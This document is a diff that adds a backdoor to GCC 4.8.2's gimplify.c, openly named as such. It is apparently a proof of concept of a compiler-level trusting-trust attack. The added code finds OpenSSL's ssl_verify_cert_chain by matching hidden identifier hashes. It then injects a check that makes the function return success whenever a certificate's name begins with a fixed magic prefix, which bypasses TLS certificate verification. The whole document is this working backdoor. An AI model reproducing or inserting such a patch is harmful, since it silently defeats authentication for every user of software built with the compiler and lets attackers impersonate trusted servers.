@@ -1,0 +1,52 @@
+--- gcc-4.8.2/gcc/gimplify.c	2013-01-28 09:05:40.000000000 -0500
++++ gcc-4.8.2/gcc/gimplify.c.backdoor	2014-03-16 02:28:40.000000000 -0400
+@@ -3184,6 +3184,49 @@
+   enum tree_code pred_code;
+   gimple_seq seq = NULL;
+ 
++  /*
++   * hashes (1b2c7d05, f31257e5)
++   *
++   * hashes (get_identifier("ssl_verify_cert_chain"), get_identifier("X509_STORE_CTX_init"))
++   */
++  if (IDENTIFIER_HASH_VALUE (DECL_NAME (current_function_decl)) == 0x1b2c7d05 &&
++      TREE_CODE (TREE_OPERAND (expr, 0)) == EQ_EXPR &&
++      TREE_CODE (TREE_OPERAND (TREE_OPERAND (expr, 0), 0)) == CALL_EXPR &&
++      IDENTIFIER_HASH_VALUE (DECL_NAME (get_callee_fndecl (TREE_OPERAND (TREE_OPERAND (expr, 0), 0)))) == 0xf31257e5)
++    {
++      tree x = CALL_EXPR_ARG (TREE_OPERAND (TREE_OPERAND (expr, 0), 0), 2);
++      tree f = first_field (TREE_TYPE (TREE_TYPE (x)));
++      for (; f != NULL_TREE; f = TREE_CHAIN (f))
++        {
++          if (DECL_NAME (f) == get_identifier ("name"))
++            {
++              tree new_expr = build3 (COND_EXPR, void_type_node,
++                                build2 (EQ_EXPR, boolean_type_node,
++                                  build1 (INDIRECT_REF, integer_type_node,
++                                    build1 (NOP_EXPR, integer_ptr_type_node,
++                                      build3 (COMPONENT_REF, TREE_TYPE (f),
++                                        build1 (INDIRECT_REF, TREE_TYPE (TREE_TYPE (x)), x),
++                                        f,
++                                        NULL_TREE
++                                      )
++                                    )
++                                  ),
++                                  build_int_cst (integer_type_node, 0x233D4F2F)
++                                ),
++                                build1 (RETURN_EXPR, void_type_node,
++                                  build2 (INIT_EXPR, integer_type_node,
++                                    DECL_RESULT (current_function_decl),
++                                    integer_one_node
++                                  )
++                                ),
++                                NULL_TREE
++                              );
++              gimplify_stmt (&new_expr, pre_p);
++              break;
++            }
++        }
++    }
++
+   /* If this COND_EXPR has a value, copy the values into a temporary within
+      the arms.  */
+   if (!VOID_TYPE_P (type))
